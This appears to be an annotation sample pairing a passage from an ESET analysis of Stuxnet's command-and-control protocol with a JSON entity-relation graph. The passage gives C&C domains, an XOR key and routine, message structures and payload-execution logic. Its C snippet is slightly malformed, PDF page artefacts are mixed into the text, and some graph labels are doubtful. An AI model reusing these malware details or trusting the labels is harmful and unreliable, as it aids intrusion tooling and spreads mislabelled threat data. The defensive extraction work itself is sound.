@@ -1,0 +1,159 @@
+
+
+
+Sentence : 4.4 Remote Communication Protocol
+The malware communicates to the C&C server through http. A list of URLs is included in the Stuxnet
+configuration data of Stuxnet: 
+www.windowsupdate.com ; 
+www.msn.com ; 
+www.mypremierfutbol.com ; 
+www.todaysfutbol.com
+The first two URLs are used to check that the system has connection to the Internet, while the third and
+the fourth are URLs of C&C servers. If it fails to successfully establish connection with the remote host
+(www.windowsupdate.com) it stops sending data to the C&C server.
+When the malware confirms that the infected computer is connected to the Internet it sends an http
+request to the remote server. Here is an example of the URL with data:
+http:// www.mypremierfutbol.com/index.php?data=data_to_send,
+where data_to_send is encrypted and encoded message.
+It uses a custom encryption algorithm with a key length equal 31 bytes:
+```
+// Encryption
+char Key[31] = { 0x67, 0xA9, 0x6E, 0x28, 0x90, 0x0D, 0x58, 0xD6,
+       0xA4, 0x5D, 0xE2, 0x72, 0x66, 0xC0, 0x4A, 0x57,
+
+       0x88, 0x5A, 0xB0, 0x5C, 0x6E, 0x45, 0x56, 0x1A,
+
+       0xBD, 0x7C, 0x71, 0x5E, 0x42, 0xE4, 0xC1  };
+
+// Encryption procedure
+void EncryptData(char Buffer, int BufferSize, char Key)
+{
+for (int i = 0 ; i < BufferSize ; i ++)
+
+   Buffer[i] ^= Key[i % 31];
+
+return;
+
+}
+```
+The encrypted data are represented as a string of Unicode characters: each byte of the binary data is
+presented as 2 characters. For instance, 0x 7A96E2890 will be written as "7A96E2890" Unicode string.
+The data to be sent have the following structure:
+www.eset.com
+67
+Figure 4.19 – The Structure of the Data Sent to C&C Server
+The first byte of the data is a hexadecimal constant 0x01, followed by 16 bytes of the malware
+configuration data. The IP address of the host is the first non-loopback entry in the list of IPv4 addresses
+of the host sorted in the ascending order.
+While preparing the data to be sent the malware gathers information about all the network adapters
+installed on the system by calling the GetAdaptersInfo API. This includes: 
+The adapter name; 
+The adapter description; 
+The hardware address of the adapter; 
+The list of IPv4 addresses associated with the adapter; 
+The IPv4 address of the gateway for the adapter; 
+The IPv4 address of the DHCP server for the adapter; 
+The IPv4 address of the primary WINS server; 
+The IPv4 address of the secondary WINS server;
+The message field can be described with the following structure:
+```
+struct STUXNET_CC_MESSAGE
+{
+BYTE Constant; // Set to 0x01
+
+BYTE ConfigByte; // A BYTE of the configuration data
+
+BYTE OsVerMajor; // The major version number of the OS
+
+BYTE OsVerMinor; // The minor version number of the OS
+
+BYTE OsVerServicePackMajor; // The major version number of the service pack
+                  // installed on the system
+
+BYTE Reserved[3]; // padding
+
+DWORD ConfigDword;  // A DWORD of the configuration data
+
+WORD CurrentACP; // Current ANSI code page identifier for the
+                  // system
+
+WORD OsVerSuitMask;  // A bitmask identifying the product suites
+                  // available on the system
+
+BYTE Flags; // See reference bellow
+
+```
+www.eset.com
+```
+};
+```
+68
+```
+char ComputerName[];  // NetBIOS name of the local computer
+char DomainName[];  // Name of the domain or workgroup the computer
+                   // is joined to if any
+char ConfigDataStr[]; // A string from configuration data
+```
+Figure 4.20 – Description of the Flags Field in STUXNET_CC_MESSAGE Structure
+We can see that flags corresponding to the first and the last bits in the byte are unused. Flags 1,4,5,6 are
+related to the configuration data of the malware. Flag 2 signifies whether Stuxnet is active. Flag 3 is set
+in case Stuxnet detects Siemens software installed on the infected machine, which it does by searching
+in the registry the following keys and values: 
+Key – HKLM\SOFTWARE\SIEMENS\STEP7, value – STEP7_Version ; 
+Key – HKLM\SOFTWARE\SIEMENS\WinCC\Setup, value – Version.
+When the message is constructed, the malware encrypts it by XORing each byte with the hexadecimal
+constant 0xFF. The malware receives a response from the C&C server which is structured as follows:
+Figure 4.21 – The Structure of the Response from the C&C Server
+The first four bytes of the response store the size of the image in the received data: if image size plus 5
+bytes isn't equal to the size of the received data, then Stuxnet stops parsing the response. On receiving
+the response the malware loads the image and call its export with ordinal number 1. The fifth byte of
+the response specifies exactly how it should be executed. If this byte is set to 0x01, then an RPC function
+will be called and as a result the received image will be executed at the address of the process hosting
+Stuxnet's RPC server. If the fifth byte is zero, then the image will be loaded into the address space of this
+process and an export function numbered as 1 will be executed. The following figure clarifies this
+mechanism:
+www.eset.com
+69
+Figure 4.22 – Dispatching Received Data
+www.eset.com
+70
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "The malware", "type" : "TTPS"},
+        {"id": 2, "description": "C&C server", "type" : "CCSH"},
+        {"id": 3, "description": "http", "type" : "NETP"},
+        {"id": 4, "description": "www.windowsupdate.com", "type" : "URLS"},
+        {"id": 5, "description": "www.msn.com", "type" : "URLS"},
+        {"id": 6, "description": "www.mypremierfutbol.com", "type" : "URLS"},
+        {"id": 7, "description": "www.todaysfutbol.com", "type" : "URLS"},
+        {"id": 8, "description": "http:// www.mypremierfutbol.com/index.php?data=data_to_send", "type" : "URLS"},
+        {"id": 9, "description": "0x67, 0xA9, 0x6E, 0x28, 0x90, 0x0D, 0x58, 0xD6, 0xA4, 0x5D, 0xE2, 0x72, 0x66, 0xC0, 0x4A, 0x57, 0x88, 0x5A, 0xB0, 0x5C, 0x6E, 0x45, 0x56, 0x1A, 0xBD, 0x7C, 0x71, 0x5E, 0x42, 0xE4, 0xC1", "type" : "TAMP"},
+        {"id": 10, "description": "Unicode characters", "type" : "TAMP"},
+        {"id": 11, "description": "www.eset.com", "type" : "URLS"},
+        {"id": 12, "description": "GetAdaptersInfo API", "type" : "APPS"},
+        {"id": 13, "description": "0x01", "type" : "TAMP"},
+        {"id": 14, "description": "STUXNET_CC_MESSAGE structure", "type" : "TAMP"},
+        {"id": 15, "description": "HKLM\\SOFTWARE\\SIEMENS\\STEP7, value – STEP7_Version", "type" : "REGI"},
+        {"id": 16, "description": "HKLM\\SOFTWARE\\SIEMENS\\WinCC\\Setup, value – Version", "type" : "REGI"},
+        {"id": 17, "description": "0xFF", "type" : "TAMP"},
+        {"id": 18, "description": "RPC function with ordinal number 1", "type" : "APPS"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "rel_name" : "communicates to"},
+        {"source": 1, "target": 3, "rel_name" : "uses protocol"},
+        {"source": 1, "target": 4, "rel_name" : "checks connection with"},
+        {"source": 1, "target": 5, "rel_name" : "checks connection with"},
+        {"source": 1, "target": 6, "rel_name" : "sends data to"},
+        {"source": 1, "target": 7, "rel_name" : "sends data to"},
+        {"source": 1, "target": 8, "rel_name" : "constructs URL with encrypted data"},
+        {"source": 1, "target": 9, "rel_name" : "uses key for encryption"},
+        {"source": 1, "target": 10, "rel_name" : "represents as Unicode characters"},
+        {"source": 1, "target": 12, "rel_name" : "calls API to gather information"},
+        {"source": 14, "rel_name" : "contains", "target": 13},
+        {"source": 1, "target": 15, "rel_name" : "searches in registry for key and value"},
+        {"source": 1, "target": 16, "rel_name" : "searches in registry for key and value"},
+        {"source": 1, "target": 17, "rel_name" : "encrypts message with constant"},
+        {"source": 2, "target": 18, "rel_name" : "calls RPC function to execute image"}
+    ]
+}
